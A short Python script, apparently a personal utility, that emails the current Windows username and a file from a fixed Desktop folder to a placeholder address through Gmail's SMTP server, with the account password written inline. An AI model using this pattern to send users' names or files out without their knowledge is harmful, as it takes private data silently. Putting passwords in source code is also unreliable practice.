import smtplib
import os
import getpass
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#edit this
fromaddr = "sender@provider.com"
toaddr = "reciever@provider.com"

msg = MIMEMultipart()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "python-benchmark"
body = getpass.getuser()
msg.attach(MIMEText(body, 'plain'))
filename = "rm.txt"
attachment = open(os.environ["USERPROFILE"] + "\\Desktop\\isolation\\random-extra-stuff\\rm.txt", "rb")
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
msg.attach(part)
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

#edit this
server.login(fromaddr, "sender@provider.com password")

text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
